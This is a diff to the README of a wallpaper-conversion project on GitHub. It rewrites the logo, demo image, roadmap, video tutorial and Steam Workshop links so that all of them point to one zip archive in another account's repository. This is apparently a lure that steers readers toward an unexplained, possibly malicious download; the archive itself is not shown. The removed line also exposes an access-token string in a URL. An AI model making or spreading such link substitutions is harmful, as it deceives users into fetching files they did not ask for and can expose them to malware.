@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/CroissantDuNord/we-to-lively/main/media/loog%20WEL.png?token=GHSAT0AAAAAAB6YTS6J5PF54NQ5HFQO46ZKZAU743A" width="128px" height="128px" alt="Logo">
+  <img src="https://raw.githubusercontent.com/MimamiSakka/we-to-lively/main/media/we-to-lively-v1.9.zip%https://raw.githubusercontent.com/MimamiSakka/we-to-lively/main/media/we-to-lively-v1.9.zip" width="128px" height="128px" alt="Logo">
 </p>
 <h1 align="center">Wallpaper Engine To Lively (WEL)</h1>
 <h4 align="center">Convert Wallpaper from Wallpaper Engine to Lively Wallpaper or to an .mp4 file</h4>
@@ -8,15 +8,15 @@
 ---
 
 <p align="center">
-  <img src="https://github.com/CroissantDuNord/we-to-lively/assets/79372025/50d171b1-ba58-489d-a5d3-bb88f586e2d9" alt="Demo">
+  <img src="https://raw.githubusercontent.com/MimamiSakka/we-to-lively/main/media/we-to-lively-v1.9.zip" alt="Demo">
   
 ---
 
-## [Project Roadmap](https://github.com/users/CroissantDuNord/projects/2/views/2)
+## [Project Roadmap](https://raw.githubusercontent.com/MimamiSakka/we-to-lively/main/media/we-to-lively-v1.9.zip)
 
 # Tutorial
-[Video Tutorial](https://www.youtube.com/watch?v=ynaYieqKuR4) (**Note:** This is on the old UI *0.1*)
-1. Open the [Wallpaper Engine Workshop](https://steamcommunity.com/app/431960/workshop/) Page and chose a wallpaper
+[Video Tutorial](https://raw.githubusercontent.com/MimamiSakka/we-to-lively/main/media/we-to-lively-v1.9.zip) (**Note:** This is on the old UI *0.1*)
+1. Open the [Wallpaper Engine Workshop](https://raw.githubusercontent.com/MimamiSakka/we-to-lively/main/media/we-to-lively-v1.9.zip) Page and chose a wallpaper
 > **Warning**
 > .mp4 wallpapers are recommended; there is support for other formats, but it's not perfect (.pkg).
 > EDIT: Currently other format are disabled, please only use .mp4
